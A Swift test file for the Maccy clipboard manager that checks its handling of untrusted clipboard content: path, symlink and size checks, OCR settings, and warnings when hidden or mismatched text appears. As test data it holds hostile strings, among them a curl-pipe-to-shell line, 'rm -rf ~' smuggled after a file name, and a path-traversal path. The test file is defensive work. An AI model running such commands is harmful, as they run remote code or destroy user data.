import AppKit
import Defaults
import ImageIO
import SwiftData
import Testing
import UniformTypeIdentifiers
@testable import Maccy

// A7: clipboard content is untrusted. What Maccy shows is what it pastes, and
// reading a copy loads nothing, doesn't stall and doesn't exhaust memory.
extension SharedStateTests {
  @MainActor
  final class UntrustedContentTests { // swiftlint:disable:this type_body_length
    let clipboard = Clipboard.shared
    let pasteboard = NSPasteboard.general
    let preferences = Defaults.Keys.enabledPasteboardTypes.suite

    let savedEnabledTypes = SavedStoragePreference()
    let savedCaptureSettings = SavedCaptureSettings(Clipboard.shared.capturePreferences)
    let savedIgnoreRegexp = Defaults[.ignoreRegexp]
    let savedIgnoreAllAppsExceptListed = Defaults[.ignoreAllAppsExceptListed]
    let savedIgnoredApps = Defaults[.ignoredApps]
    let savedIgnoredPasteboardTypes = Defaults[.ignoredPasteboardTypes]
    let savedIntentsEnabled = Defaults[.intentsEnabled]

    init() {
      preferences.removeObject(forKey: StoragePolicy.preferenceKey)
      Defaults[.ignoreRegexp] = []
      Defaults[.ignoredApps] = []
      Defaults[.ignoredPasteboardTypes] = []
      Defaults[.ignoreAllAppsExceptListed] = false
      savedCaptureSettings.clear()
      clipboard.syncCaptureState()
      clipboard.clearHooks()
      try? Storage.shared.context.save()
      History.shared.clearAll()
      Storage.shared.saveFailureForTesting = nil
      clipboard.afterInspectionForTesting = nil
      History.shared.storageSettingChanged()
      UniversalClipboardFile.resetAccessDeniedForTesting()
    }

    deinit {
      savedEnabledTypes.restore()
      savedCaptureSettings.restore()
      Defaults[.ignoreRegexp] = savedIgnoreRegexp
      Defaults[.ignoreAllAppsExceptListed] = savedIgnoreAllAppsExceptListed
      Defaults[.ignoredApps] = savedIgnoredApps
      Defaults[.ignoredPasteboardTypes] = savedIgnoredPasteboardTypes
      Defaults[.intentsEnabled] = savedIntentsEnabled
      UniversalClipboardFile.allowedDirectoriesForTesting = nil
      UniversalClipboardFile.maximumBytesForTesting = nil
      UniversalClipboardFile.readObserverForTesting = nil
      UniversalClipboardFile.resetAccessDeniedForTesting()
      ContentLimits.maximumRepresentationBytesForTesting = nil
      ContentLimits.maximumCopyBytesForTesting = nil
      ContentLimits.maximumImagePixelsForTesting = nil
      OCRSetting.preferencesForTesting = nil
      HistoryItem.visionInputObserverForTesting = nil
      HistoryItem.recognitionWorkObserverForTesting = nil
      ValidatedImage.maximumImageCountForTesting = nil
    }

    // MARK: Group 1: one value per type

    @Test("Two pasteboard items with different strings: one string is stored, shown and pasted everywhere")
    func twoItemsWithDifferentStrings() throws {
      let first = NSPasteboardItem()
      first.setString("shown text", forType: .string)
      let second = NSPasteboardItem()
      second.setString("other text", forType: .string)
      pasteboard.clearContents()
      pasteboard.writeObjects([first, second])
      // The classic plain-text API joins both items; Maccy keeps the first.
      #expect(pasteboard.string(forType: .string) == "shown text\nother text")

      let copied = try #require(checkNow().first)
      let decorator = History.shared.added(copied)
      let item = decorator.item
      #expect(stringValues(item) == ["shown text"])
      expectReadsEverywhere(decorator, as: "shown text")
    }

    @Test("A formatted version with other text is flagged in the preview; the same text is not")
    func formattedTextMismatchIsIndicated() throws {
      let first = NSPasteboardItem()
      first.setString("Pay Alice 100", forType: .string)
      let second = NSPasteboardItem()
      second.setString("<p><b>Pay Mallory 100</b></p>", forType: .html)
      pasteboard.clearContents()
      pasteboard.writeObjects([first, second])

      let decorator = History.shared.added(try #require(checkNow().first))
      #expect(decorator.item.displayTitle == "Pay Alice 100")
      #expect(decorator.formattedTextComparison == .differs)
      #expect(PreviewItemView.formattedTextNote(.differs) != nil)

      // Only whitespace differs: nothing is said, and nothing claims they match.
      let same = NSPasteboardItem()
      same.setString("Pay  Alice 100", forType: .string)
      same.setString("<ul><li>Pay <i>Alice</i>&nbsp;100</li></ul>", forType: .html)
      let rtf = NSAttributedString(string: "Pay Alice 100")
      same.setData(try #require(rtf.rtf(from: NSRange(location: 0, length: rtf.length))), forType: .rtf)
      pasteboard.clearContents()
      pasteboard.writeObjects([same])
      let sameDecorator = History.shared.added(try #require(checkNow().first))
      #expect(sameDecorator.formattedTextComparison == .noTextDifference)
      #expect(PreviewItemView.formattedTextNote(.noTextDifference) == nil)
    }

    @Test("A Finder copy of several files keeps and pastes every file, each once")
    func multiFileCopyPastesAllFiles() throws {
      let urls = ["/tmp/a7 first file.txt", "/tmp/a7-second.txt", "/tmp/a7-third.pdf"].map {
        URL(fileURLWithPath: $0)
      }
      let items = (urls + [urls[0]]).map { url in
        let item = NSPasteboardItem()
        item.setData(url.dataRepresentation, forType: .fileURL)
        return item
      }
      pasteboard.clearContents()
      pasteboard.writeObjects(items)

      let decorator = History.shared.added(try #require(checkNow().first))
      let item = decorator.item
      #expect(item.contents.filter { $0.type == NSPasteboard.PasteboardType.fileURL.rawValue }.count == 3)
      #expect(Set(item.fileURLs) == Set(urls))

      for removeFormatting in [false, true] {
        clipboard.copy(item, removeFormatting: removeFormatting)
        let pasted = (pasteboard.pasteboardItems ?? []).compactMap { pasteboardItem in
          pasteboardItem.data(forType: .fileURL).flatMap { URL(dataRepresentation: $0, relativeTo: nil) }
        }
        #expect(pasted.count == 3)
        #expect(Set(pasted) == Set(urls))
      }
    }

    @Test("An item stored with two values of one type reads, shows and pastes the same one",
          arguments: [false, true])
    func storedDuplicatesAgree(reversed: Bool) throws {
      let values = ["zulu", "alpha"]
      let item = HistoryItem()
      Storage.shared.context.insert(item)
      item.contents = (reversed ? values.reversed() : values).map {
        HistoryItemContent(type: NSPasteboard.PasteboardType.string.rawValue, value: Data($0.utf8))
      }
      // A title an earlier version made from whichever value it read.
      item.setTitle(reversed ? "alpha" : "zulu", source: .content(NSPasteboard.PasteboardType.string.rawValue))
      try Storage.shared.context.save()

      // The smallest value by bytes, whatever order the store returns.
      let decorator = HistoryItemDecorator(item)
      expectReadsEverywhere(decorator, as: "alpha")
      item.setTitle("zulu", source: .unknown)
      #expect(item.displayTitle == "alpha")

      let reloaded = try #require(ModelContext(Storage.shared.container).model(for: item.persistentModelID)
        as? HistoryItem)
      #expect(reloaded.displayTitle == "alpha")
      #expect(reloaded.pasteboardContents(readableBy: .everything).compactMap(\.value) == [Data("alpha".utf8)])

      // A new copy of the value shown is a duplicate of it; a copy of the
      // other value is not.
      #expect(item.supersedes(HistoryItem(contents: [stringContent("alpha")])))
      #expect(!item.supersedes(HistoryItem(contents: [stringContent("zulu")])))

      // The editor saves exactly one string.
      #expect(item.replaceText(with: Data("edited".utf8), storing: StoragePolicy.current))
      #expect(stringValues(item) == ["edited"])
      #expect(item.contents.count == 1)
    }

    // MARK: Group 2: the Universal Clipboard file

    @Test("A Universal Clipboard image file is read only if it passes every check, and never on the main thread")
    func universalClipboardFileChecks() async throws {
      let files = FileManager.default
      let root = files.temporaryDirectory.appending(path: "a7-uc-\(UUID().uuidString)")
      let staging = root.appending(path: "items")
      let elsewhere = root.appending(path: "elsewhere")
      try files.createDirectory(at: staging.appending(path: "copy"), withIntermediateDirectories: true)
      try files.createDirectory(at: elsewhere, withIntermediateDirectories: true)
      defer { try? files.removeItem(at: root) }
      UniversalClipboardFile.allowedDirectoriesForTesting = [staging.path]
      let jpeg = try jpegData()
      UniversalClipboardFile.maximumBytesForTesting = jpeg.count

      let valid = staging.appending(path: "copy/photo.jpeg")
      try jpeg.write(to: valid)
      let outside = elsewhere.appending(path: "photo.jpeg")
      try jpeg.write(to: outside)
      let directory = staging.appending(path: "folder.jpeg")
      try files.createDirectory(at: directory, withIntermediateDirectories: true)
      let symlink = staging.appending(path: "link.jpeg")
      try files.createSymbolicLink(at: symlink, withDestinationURL: outside)
      let linkedDirectory = staging.appending(path: "linked")
      try files.createSymbolicLink(at: linkedDirectory, withDestinationURL: elsewhere)
      let throughLinkedDirectory = linkedDirectory.appending(path: "photo.jpeg")
      let oversized = staging.appending(path: "copy/large.jpeg")
      try (jpeg + Data([0])).write(to: oversized)
      let remote = try #require(URL(string: "https://example.com/photo.jpeg"))

      let reads = ThreadRecorder()
      UniversalClipboardFile.readObserverForTesting = { reads.record($0) }

      // A valid file: shown as an image, but only read in the background.
      let item = universalClipboardItem(valid)
      #expect(HistoryItemDecorator(item).hasImage)
      #expect(item.imagePixelSize == nil)
      #expect(item.imageData == nil)
      #expect(reads.values.isEmpty)
      await item.loadImageIfNeeded()
      #expect(item.imageData == jpeg)
      #expect(item.imagePixelSize != nil)
      #expect(Get.contents(of: item, readableBy: StoragePolicy.currentReadAllowList).image == jpeg)

      // Paths outside the staging location are never looked up at all.
      for url in [remote, outside] {
        let rejected = universalClipboardItem(url)
        #expect(rejected.imageSource(readableBy: .everything) == nil)
        await rejected.loadImageIfNeeded()
        #expect(rejected.imageData == nil)
        #expect(!HistoryItemDecorator(rejected).hasImage)
      }
      // Inside it, but not a regular local file within the limit.
      for url in [directory, symlink, throughLinkedDirectory, oversized] {
        let rejected = universalClipboardItem(url)
        await rejected.loadImageIfNeeded()
        #expect(rejected.imageData == nil, "\(url.lastPathComponent)")
        #expect(rejected.imagePixelSize == nil, "\(url.lastPathComponent)")
      }
      // Every read so far ran in the background.
      #expect(reads.values.count == 5)
      #expect(reads.values.allSatisfy { !$0 })

      // Why each one is refused.
      UniversalClipboardFile.readObserverForTesting = nil
      #expect(throws: UniversalClipboardFile.Rejection.notFileURL) { try UniversalClipboardFile.read(remote) }
      #expect(throws: UniversalClipboardFile.Rejection.outsideAllowedLocation) {
        try UniversalClipboardFile.read(outside)
      }
      #expect(throws: UniversalClipboardFile.Rejection.notRegularFile) { try UniversalClipboardFile.read(directory) }
      #expect(throws: UniversalClipboardFile.Rejection.notRegularFile) { try UniversalClipboardFile.read(symlink) }
      #expect(throws: UniversalClipboardFile.Rejection.outsideAllowedLocation) {
        try UniversalClipboardFile.read(throughLinkedDirectory)
      }
      #expect(throws: UniversalClipboardFile.Rejection.tooLarge) { try UniversalClipboardFile.read(oversized) }
      #expect(throws: UniversalClipboardFile.Rejection.outsideAllowedLocation) {
        try UniversalClipboardFile.read(staging.appending(path: "copy/../../elsewhere/photo.jpeg"))
      }
      #expect(try UniversalClipboardFile.read(valid) == jpeg)

      // A second name for the file (a hard link) is refused, whichever name is used.
      let hardLink = staging.appending(path: "copy/hard.jpeg")
      #expect(link(valid.path, hardLink.path) == 0)
      #expect(throws: UniversalClipboardFile.Rejection.hardLinked) { try UniversalClipboardFile.read(hardLink) }
      #expect(throws: UniversalClipboardFile.Rejection.hardLinked) { try UniversalClipboardFile.read(valid) }
      try files.removeItem(at: hardLink)
      #expect(try UniversalClipboardFile.read(valid) == jpeg)

      // An allowed directory that is itself a symlink to elsewhere is refused.
      let linkedRoot = root.appending(path: "linked-root")
      try files.createSymbolicLink(at: linkedRoot, withDestinationURL: staging)
      UniversalClipboardFile.allowedDirectoriesForTesting = [linkedRoot.path]
      #expect(throws: UniversalClipboardFile.Rejection.allowedDirectoryNotTrusted) {
        try UniversalClipboardFile.read(linkedRoot.appending(path: "copy/photo.jpeg"))
      }

      // A file owned by another user is refused (checked on its status).
      var status = stat()
      #expect(stat(valid.path, &status) == 0)
      #expect(throws: UniversalClipboardFile.Rejection.notOwnedByUser) {
        try UniversalClipboardFile.check(status, userID: getuid() + 1)
      }
      try UniversalClipboardFile.check(status)
    }

    @Test("Without an override, only the current user's staging directories are allowed")
    func universalClipboardStagingDirectories() throws {
      let directories = UniversalClipboardFile.allowedDirectories
      #expect(!directories.contains { $0.contains("*") })
      #expect(directories.contains {
        $0.hasSuffix("/Library/Group Containers/group.com.apple.coreservices.useractivityd/shared-pasteboard/items/")
      })
      // The per-user temporary directory, when it can be found, is this user's only.
      let temporary = directories.filter { $0.hasPrefix("/private/var/folders/") }
      #expect(temporary.count <= 1)
      if let ours = temporary.first {
        #expect(ours.hasSuffix("/T/com.apple.useractivityd/shared-pasteboard/items/"))
        #expect(UniversalClipboardFile.isInAllowedLocation(URL(fileURLWithPath: ours + "UUID/photo.jpeg")))
        let unaliased = String(ours.dropFirst("/private".count))
        #expect(UniversalClipboardFile.isInAllowedLocation(URL(fileURLWithPath: unaliased + "UUID/photo.jpeg")))
      }
      for path in [
        "/Volumes/Share/photo.jpeg",
        "/private/var/folders/zz/another-user/T/com.apple.useractivityd/shared-pasteboard/items/UUID/photo.jpeg",
        "/private/var/folders/ab/T/com.apple.useractivityd/shared-pasteboard/items/photo.jpeg",
        "/private/var/folders/ab/cd/T/com.apple.useractivityd/shared-pasteboard/items",
        "/private/var/folders/ab/cd/T/com.apple.useractivityd/shared-pasteboard/itemsX/photo.jpeg",
        "/private/var/folders/ab/cd/T/com.apple.useractivityd/shared-pasteboard/items/../../../../x.jpeg"
      ] {
        #expect(!UniversalClipboardFile.isInAllowedLocation(URL(fileURLWithPath: path)), "\(path)")
      }

      #expect(UniversalClipboardFile.userTemporaryRoot(of: "/var/folders/ab/cd/T/") == "/private/var/folders/ab/cd/T/")
      #expect(UniversalClipboardFile.userTemporaryRoot(of: "/private/var/folders/ab/cd/T/com.example/") ==
              "/private/var/folders/ab/cd/T/")
      #expect(UniversalClipboardFile.userTemporaryRoot(of: "/Users/someone/Library/Containers/x/Data/tmp/") == nil)
      #expect(UniversalClipboardFile.userTemporaryRoot(of: "/var/folders/ab/cd/C/") == nil)
    }

    // MARK: Group 3: no WebKit import

    @Test("HTML referring to a remote image and style sheet is captured, titled and checked without rendering it")
    func htmlIsNeverRendered() throws {
      // Every WebKit importer is gone from the app (tools/check-rich-text-importers.py
      // enforces it in CI), so nothing below can load these. This checks the
      // paths produce the scanned text, import no RTF and load no WebKit.
      let webKitWasLoaded = webKitIsLoaded
      let rtfImports = RichTextImport.rtfImportsForTesting
      let html = """
        <html><head><link rel="stylesheet" href="https://example.invalid/a7.css">
        <style>@import url("https://example.invalid/b.css");</style></head>
        <body><img src="https://example.invalid/a7.png"><p>Hello <b>remote</b></p></body></html>
        """
      let item = NSPasteboardItem()
      item.setString(html, forType: .html)
      pasteboard.clearContents()
      pasteboard.writeObjects([item])

      let decorator = History.shared.added(try #require(checkNow().first))
      // The scanned text; block breaks may show as special symbols.
      #expect(decorator.item.displayTitle.contains("Hello remote"))
      decorator.item.regenerateTitle()
      #expect(decorator.item.displayTitle.contains("Hello remote"))
      #expect(decorator.previewText.string.contains("Hello remote"))
      #expect(decorator.hasRichText)
      #expect(!decorator.hasPlainText)
      #expect(RichTextImport.rtfImportsForTesting == rtfImports)
      if !webKitWasLoaded {
        #expect(!webKitIsLoaded)
      }
    }

    @Test("RTF is imported for a title only within the ignore-rule RTF limits")
    func rtfImportIsBounded() throws {
      let small = NSAttributedString(string: "Small rich text")
      let smallRTF = try #require(small.rtf(from: NSRange(location: 0, length: small.length)))
      let imports = RichTextImport.rtfImportsForTesting
      #expect(RichTextImport.text(fromRTF: smallRTF) == "Small rich text")
      #expect(RichTextImport.rtfImportsForTesting == imports + 1)

      let large = NSAttributedString(string: String(repeating: "x", count: IgnoreRules.rtfDataLimit + 1))
      let largeRTF = try #require(large.rtf(from: NSRange(location: 0, length: large.length)))
      #expect(!RichTextImport.rtfIsImportable(largeRTF))
      let item = HistoryItem(contents: [
        HistoryItemContent(type: NSPasteboard.PasteboardType.rtf.rawValue, value: largeRTF)
      ])
      Storage.shared.context.insert(item)
      item.regenerateTitle()
      #expect(item.displayTitle == "")
      #expect(HistoryItemDecorator(item).hasRichText)
      #expect(RichTextImport.rtfImportsForTesting == imports + 1)
    }

    // MARK: Group 4: size limits, OCR

    @Test("A representation at the limit is recorded; one byte over and the whole copy is not")
    func perRepresentationLimit() throws {
      ContentLimits.maximumRepresentationBytesForTesting = 100
      copyString(String(repeating: "a", count: 100))
      #expect(checkNow().count == 1)

      // Over the limit: nothing is recorded, and skip next isn't used up.
      clipboard.perform(.toggleSkipNext)
      copyString(String(repeating: "b", count: 101))
      #expect(checkNow().isEmpty)
      #expect(CaptureMode.effective(in: clipboard.capturePreferences) == .skipNext)
      clipboard.perform(.toggleSkipNext)
      #expect(CaptureMode.effective(in: clipboard.capturePreferences) == .capturing)
    }

    @Test("A copy at the total limit is recorded; one byte over and it is not")
    func perCopyLimit() throws {
      ContentLimits.maximumRepresentationBytesForTesting = 100
      ContentLimits.maximumCopyBytesForTesting = 150
      for (htmlBytes, recorded) in [(50, true), (51, false)] {
        let item = NSPasteboardItem()
        item.setString(String(repeating: "a", count: 100), forType: .string)
        item.setString("<b>" + String(repeating: "c", count: htmlBytes - 7) + "</b>", forType: .html)
        pasteboard.clearContents()
        pasteboard.writeObjects([item])
        #expect(checkNow().count == (recorded ? 1 : 0), "HTML of \(htmlBytes) bytes")
      }

      // Across pasteboard items too.
      let first = NSPasteboardItem()
      first.setString(String(repeating: "d", count: 100), forType: .string)
      let second = NSPasteboardItem()
      second.setData(Data(repeating: 1, count: 51), forType: .png)
      pasteboard.clearContents()
      pasteboard.writeObjects([first, second])
      #expect(checkNow().isEmpty)
    }

    @Test("The default limits: 64 MiB per representation, 96 MiB per copy; a 5K capture as TIFF plus PNG fits")
    func defaultLimitsFitScreenshots() {
      #expect(ContentLimits.maximumRepresentationBytes == 64 * 1_024 * 1_024)
      #expect(ContentLimits.maximumCopyBytes == 96 * 1_024 * 1_024)
      // 5K Retina full screen (5120×2880) as uncompressed 32-bit TIFF: 59.0 MB.
      let tiff = 5_120 * 2_880 * 4 + 64 * 1_024
      #expect(tiff <= ContentLimits.maximumRepresentationBytes)
      #expect(tiff + 25 * 1_024 * 1_024 <= ContentLimits.maximumCopyBytes)
      // A 6K capture (6016×3384) as TIFF is over the limit and is not recorded.
      #expect(6_016 * 3_384 * 4 > ContentLimits.maximumRepresentationBytes)
      #expect(5_120 * 2_880 <= ContentLimits.maximumImagePixels)
      #expect(UniversalClipboardFile.maximumBytes == ContentLimits.maximumRepresentationBytes)
    }

    @Test("An image over the pixel limit is never decoded or passed to text recognition")
    func pixelLimit() async throws {
      ContentLimits.maximumImagePixelsForTesting = 100
      let small = try pngData(width: 10, height: 10)
      let large = try pngData(width: 11, height: 10)
      #expect(ValidatedImage.inspect(large) == .failure(.imageTooLarge(index: 0, pixels: 110)))
      #expect(ValidatedImage.isAcceptable(small))
      #expect(!ValidatedImage.isAcceptable(large))
      #expect(!ValidatedImage.isAcceptable(Data("not an image".utf8)))

      let smallItem = imageItem(small)
      #expect(smallItem.imagePixelSize == NSSize(width: 10, height: 10))
      #expect(ValidatedImage.cgImage(from: small, for: .preview) != nil)
      #expect(await ValidatedImage.decode(small, for: .preview) != nil)
      #expect(await smallItem.decodedImage(for: .preview) != nil)
      // A temporary item, as the test was first written (see
      // `imageSourceIdentityIsStable`).
      #expect(imageItem(small).imagePixelSize == NSSize(width: 10, height: 10))
      #expect(await imageItem(small).decodedImage(for: .preview) != nil)
      let largeItem = imageItem(large)
      #expect(largeItem.imagePixelSize == nil)
      #expect(await largeItem.decodedImage(for: .preview) == nil)
      #expect(HistoryItemDecorator(largeItem).hasImage == false)

      let visionInputs = ThreadRecorder()
      HistoryItem.visionInputObserverForTesting = { _ in visionInputs.record(false) }
      #expect(await HistoryItem.recognizeText(imageData: large, fileURL: nil) == nil)
      #expect(visionInputs.values.isEmpty)
      _ = await HistoryItem.recognizeText(imageData: small, fileURL: nil)
      #expect(visionInputs.values.count == 1)
    }

    @Test("ocrEnabled: absent and true recognise; false, forced false and wrong types don't")
    func ocrSettingIsRead() throws {
      let defaults = try scratchDefaults()
      #expect(OCRSetting.effective(in: defaults) == OCRSetting(state: .on, isForced: false))
      for (value, state) in [(true, OCRSetting.State.on), (false, .off)] as [(Any, OCRSetting.State)] {
        defaults.set(value, forKey: OCRSetting.preferenceKey)
        #expect(OCRSetting.effective(in: defaults).state == state)
      }
      let wrongTypes: [Any] = ["false", "yes", 2, 0.5, [false], ["ocrEnabled": false], Data(), Date()]
      for value in wrongTypes {
        defaults.set(value, forKey: OCRSetting.preferenceKey)
        #expect(OCRSetting.effective(in: defaults).state == .invalid, "\(value)")
        #expect(!OCRSetting.effective(in: defaults).isEnabled)
      }
      for (value, state) in [(1, OCRSetting.State.on), (0, .off)] {
        defaults.set(value, forKey: OCRSetting.preferenceKey)
        #expect(OCRSetting.effective(in: defaults).state == state)
      }

      defaults.set(true, forKey: OCRSetting.preferenceKey)
      let managed = try #require(ManagedDefaults(suiteName: scratchSuiteName(), forced: [OCRSetting.preferenceKey: false]))
      managed.set(true, forKey: OCRSetting.preferenceKey)
      #expect(OCRSetting.effective(in: managed) == OCRSetting(state: .off, isForced: true))
    }

    @Test("With text recognition off no image goes to Vision, and earlier recognised titles are hidden and erased",
          arguments: ["false", "forced false", "wrong type"])
    func ocrOffRecognisesNothing(setting: String) throws {
      let image = try pngData(width: 4, height: 4)
      let defaults: UserDefaults
      switch setting {
      case "forced false":
        let managed = try #require(ManagedDefaults(suiteName: scratchSuiteName(),
                                                   forced: [OCRSetting.preferenceKey: false]))
        managed.set(true, forKey: OCRSetting.preferenceKey)
        defaults = managed
      case "wrong type":
        defaults = try scratchDefaults()
        defaults.set("yes", forKey: OCRSetting.preferenceKey)
      default:
        defaults = try scratchDefaults()
        defaults.set(false, forKey: OCRSetting.preferenceKey)
      }

      // A title recognised while it was on.
      OCRSetting.preferencesForTesting = try scratchDefaults()
      let item = imageItem(image)
      item.setTitle("recognised secret", source: .content(NSPasteboard.PasteboardType.png.rawValue))
      let typed = imageItem(try pngData(width: 5, height: 5))
      typed.setTitle("my alias", source: .user)
      try Storage.shared.context.save()
      #expect(item.displayTitle == "recognised secret")

      OCRSetting.preferencesForTesting = defaults
      #expect(!OCRSetting.current.isEnabled)
      #expect(item.displayTitle == "")
      #expect(typed.displayTitle == "my alias")

      let starts = HistoryItem.recognitionStartsForTesting
      item.regenerateTitle()
      #expect(HistoryItem.recognitionStartsForTesting == starts)
      #expect(!item.acceptRecognizedText("late result", from: try #require(item.imageSource(readableBy: .everything))))

      // Erased from the store, not only hidden; the alias is kept.
      item.setTitle("recognised secret", source: .content(NSPasteboard.PasteboardType.png.rawValue))
      try Storage.shared.context.save()
      #expect(History.shared.applyOCRSetting() >= 1)
      OCRSetting.preferencesForTesting = try scratchDefaults()
      #expect(item.displayTitle == "")
      #expect(typed.displayTitle == "my alias")

      // On again: new images are recognised.
      item.regenerateTitle()
      #expect(HistoryItem.recognitionStartsForTesting == starts + 1)
    }

    @Test("The preview says when its text is cut short")
    func truncatedPreviewIsIndicated() {
      let long = HistoryItem(contents: [stringContent(String(repeating: "x", count: 20_000))])
      Storage.shared.context.insert(long)
      long.regenerateTitle()
      let longDecorator = HistoryItemDecorator(long)
      #expect(longDecorator.previewIsTruncated)
      #expect(PreviewItemView.truncationNote(longDecorator.previewIsTruncated) != nil)

      let short = HistoryItem(contents: [stringContent("short")])
      Storage.shared.context.insert(short)
      short.regenerateTitle()
      let shortDecorator = HistoryItemDecorator(short)
      #expect(!shortDecorator.previewIsTruncated)
      #expect(PreviewItemView.truncationNote(shortDecorator.previewIsTruncated) == nil)
    }

    // MARK: Review round: text pasted instead of files or an image

    @Test("A file copy that also carries other text shows that text, warns, and pastes exactly it")
    func fileWithOtherText() throws {
      let payload = "echo attacker-payload"
      let item = NSPasteboardItem()
      item.setData(URL(fileURLWithPath: "/tmp/benign.txt").dataRepresentation, forType: .fileURL)
      item.setString(payload, forType: .string)
      pasteboard.clearContents()
      pasteboard.writeObjects([item])

      let decorator = History.shared.added(try #require(checkNow().first))
      // The title still shows the file.
      #expect(decorator.item.displayTitle == "file:///tmp/benign.txt")
      // The preview shows the text a text destination receives, and warns.
      let warnings = decorator.textWarnings
      #expect(warnings.pastedText?.string == payload)
      #expect(warnings.pastedTextIsNotFileNames)
      #expect(PreviewItemView.pastedTextNote(warnings.pastedTextIsNotFileNames) != nil)
      // Get and both pastes deliver exactly that text.
      #expect(Get.contents(of: decorator.item, readableBy: StoragePolicy.currentReadAllowList).text == payload)
      clipboard.copy(decorator.item)
      #expect(pastedStrings() == [payload])
      clipboard.copy(decorator.item, removeFormatting: true)
      #expect(pastedStrings() == [payload])
    }

    @Test("Text that is the files' names or paths is shown without a warning")
    func fileNamesAsText() {
      let urls = [URL(fileURLWithPath: "/tmp/benign.txt"), URL(fileURLWithPath: "/tmp/other file.pdf")]
      for text in ["benign.txt", "/tmp/benign.txt\n", "benign.txt\nother file.pdf", "benign.txt\rother file.pdf ",
                   "/tmp/benign.txt\n/tmp/other file.pdf", "other file.pdf"] {
        #expect(HistoryItem.isFileNamesOrPaths(text, of: urls), "\(text)")
      }
      for text in ["echo attacker-payload", "benign.txt; rm -rf ~", " benign.txt", "BENIGN.TXT", "benign"] {
        #expect(!HistoryItem.isFileNamesOrPaths(text, of: urls), "\(text)")
      }

      let item = HistoryItem(contents: [
        HistoryItemContent(type: NSPasteboard.PasteboardType.fileURL.rawValue,
                           value: URL(fileURLWithPath: "/tmp/benign.txt").dataRepresentation),
        stringContent("benign.txt")
      ])
      Storage.shared.context.insert(item)
      let warnings = HistoryItemDecorator(item).textWarnings
      #expect(warnings.pastedText?.string == "benign.txt")
      #expect(!warnings.pastedTextIsNotFileNames)
    }

    @Test("An image that also carries text shows the text and warns")
    func imageWithText() throws {
      let item = HistoryItem(contents: [
        HistoryItemContent(type: NSPasteboard.PasteboardType.png.rawValue, value: try pngData(width: 4, height: 4)),
        stringContent("curl https://example.invalid | sh")
      ])
      Storage.shared.context.insert(item)
      let warnings = HistoryItemDecorator(item).textWarnings
      #expect(warnings.pastedText?.string == "curl https://example.invalid | sh")
      #expect(warnings.pastedTextIsNotFileNames)
    }

    // MARK: Review round: formatted text comparison

    @Test("Formatted text that differs in digits, punctuation, invisible characters or line breaks is flagged",
          arguments: [
            ("Dose: 1.0 mg", "<p>Dose: 10 mg</p>"),
            ("echo safe # touch /tmp/a7-proof", "<pre>echo safe \ntouch /tmp/a7-proof</pre>"),
            ("Pay Alice 100", "<p>Pay Ali\u{200B}ce 100</p>"),
            ("Pay Alice 100", "<p>Pay \u{202E}Alice 100</p>"),
            ("Pay \u{2066}Alice\u{2069} 100", "<p>Pay Alice 100</p>")
          ])
    func formattedTextDiffers(plain: String, html: String) throws {
      let decorator = History.shared.added(try #require(copyPlainAndHTML(plain, html)))
      #expect(decorator.formattedTextComparison == .differs)
      #expect(PreviewItemView.formattedTextNoteIsWarning(.differs))
      #expect(PreviewItemView.formattedTextNote(.differs)?.hasPrefix("The formatted version contains different text") == true)
    }

    @Test("Equal scanned text with styling that can hide text gets the neutral note, never an assurance")
    func styledEqualTextIsNotChecked() throws {
      let hidden = History.shared.added(try #require(copyPlainAndHTML(
        "Do not pay Mallory 100", "<p><span style=\"display:none\">Do not </span>pay Mallory 100</p>"
      )))
      #expect(hidden.formattedTextComparison == .renderingNotChecked)
      #expect(PreviewItemView.formattedTextNote(.renderingNotChecked) == "Formatted paste was not checked against this text.")
      #expect(!PreviewItemView.formattedTextNoteIsWarning(.renderingNotChecked))

      for html in [
        "<p style=\"color:red\">Pay Alice 100</p>",
        "<style>p { color: white }</style><p>Pay Alice 100</p>",
        "<link rel=\"stylesheet\" href=\"x.css\"><p class=\"a\">Pay Alice 100</p>",
        "<p hidden>Pay Alice 100</p>",
        "<p>Pay Alice 100<script>1</script></p>",
        "<p>Pay Alice <img src=\"x.png\" alt=\"x\">100</p>",
        "<form><p>Pay Alice 100</p></form>",
        "<p>Pay Alice 100<svg></svg></p>"
      ] {
        let styled = History.shared.added(try #require(copyPlainAndHTML("Pay Alice 100", html)))
        #expect(styled.formattedTextComparison == .renderingNotChecked, "\(html)")
      }

      // Plain structural and inline markup with the same text: nothing is shown.
      let plain = History.shared.added(try #require(copyPlainAndHTML(
        "Pay Alice 100", "<div><p>Pay <b>Alice</b> <a href=\"https://example.invalid\">100</a></p></div>"
      )))
      #expect(plain.formattedTextComparison == .noTextDifference)
      #expect(PreviewItemView.formattedTextNote(.noTextDifference) == nil)
    }

    @Test("The comparison normalises only NFC and whitespace")
    func comparableText() {
      #expect(RichTextImport.comparableText(" Pay\u{00A0}\n Alice\t100 ") == "Pay Alice 100")
      #expect(RichTextImport.comparableText("caf\u{0065}\u{0301}") == RichTextImport.comparableText("caf\u{00E9}"))
      #expect(RichTextImport.comparableText("Pay alice") != RichTextImport.comparableText("Pay Alice"))
      #expect(RichTextImport.comparableText("1.0") != RichTextImport.comparableText("10"))
      #expect(RichTextImport.comparableText("a\u{200B}b") != RichTextImport.comparableText("ab"))
    }

    @Test("Invisible and direction-changing characters in the plain text are flagged")
    func invisibleCharactersAreFlagged() {
      for text in ["rm\u{200B} -rf", "abc\u{202E}def", "a\u{2066}b\u{2069}", "a\u{00AD}b", "a\u{0007}b",
                   "a\u{0085}b", "\u{FEFF}text", "tag\u{E0041}"] {
        #expect(RichTextImport.containsInvisibleOrDirectionalScalars(text), "\(text.unicodeScalars.map(\.value))")
      }
      for text in ["plain text", "tab\tand\nnewline", "👩‍💻 developer", "naïve café", "مرحبا",
                   "windows\r\nline endings\r\n", "old mac\rline"] {
        #expect(!RichTextImport.containsInvisibleOrDirectionalScalars(text), "\(text)")
      }
      let item = HistoryItem(contents: [stringContent("Pay \u{202E}001 ecilA")])
      Storage.shared.context.insert(item)
      let warnings = HistoryItemDecorator(item).textWarnings
      #expect(warnings.hasInvisibleCharacters)
      #expect(PreviewItemView.invisibleCharactersNote(warnings.hasInvisibleCharacters) != nil)
      #expect(PreviewItemView.invisibleCharactersNote(false) == nil)
    }

    @Test("HTML handed to the RTF importer is not imported as HTML")
    func rtfImportNeverSniffsHTML() {
      let html = Data("<html><body><b>Hidden</b> text</body></html>".utf8)
      let text = RichTextImport.text(fromRTF: html)
      #expect(text == nil || text?.contains("<b>") == true)
      let direct = RichTextImport.rtfText(html)
      #expect(direct == nil || direct?.contains("<b>") == true)
    }

    // MARK: Review round: images

    @Test("Every image in a container is checked; only one validated image is decoded")
